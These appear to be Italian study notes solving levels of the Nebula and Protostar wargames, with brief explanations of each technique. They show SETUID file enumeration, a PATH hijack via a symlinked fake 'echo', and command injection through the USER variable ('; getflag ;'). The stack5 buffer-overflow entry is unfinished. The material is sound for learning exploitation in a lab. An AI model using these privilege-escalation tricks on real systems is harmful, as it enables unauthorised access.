#nebula **level00**
``` bash
# Individuare un file che esegue con SETUID di flag00
# 
# -perm: cerca un file con i premessi desiderati
#        in questo caso -4000 perché cerchiamo il SETUID
# 
# -user: cerchiamo per utente desiderato
#        in questo caso flag00
find / -perm -4000 -user flag00 2>/dev/null
```
#nebula **level01**
Idea: Il binario esegue il comando **echo** di linux. L'idea è quella di create un link di **/bin/getflag** su un nostro file echo inserito su **/tmp** e aggiungerlo alla variabile **$PATH**.
``` bash
PATH=/tmp:$PATH
ln -s /bin/getflag /tmp/echo
/home/flag01/flag01
```
#protostar **stack5**
Idea: Il binario esegue con privilegi di **root** ma usa la funzione **gets** dove prende input arbitrario. L'idea è quella iniettare una shell dopo l'input inserito nella gets.
``` python
'\x41' * 64       # Stringa piene di A di grandezza 64
```
TODO: fare il payload
#nebula **level02**
Idea: Il binario legge il contenuto della variabile di ambiente **USER**. Quindi è possibile fare #command-injection nel binario andando a modificare il contenuto di quella variabile.
``` bash
export USER="; getflag ;"
```
Nota bene: si usano i caratteri ';' sia prima che dopo, perché abbiamo bisogno di rendere nulla l'esecuzione dei comandi prima e dopo la nostra injection, altrimenti echo eseguirebbe l'iniezione come una unica stringa da stampare su stdout.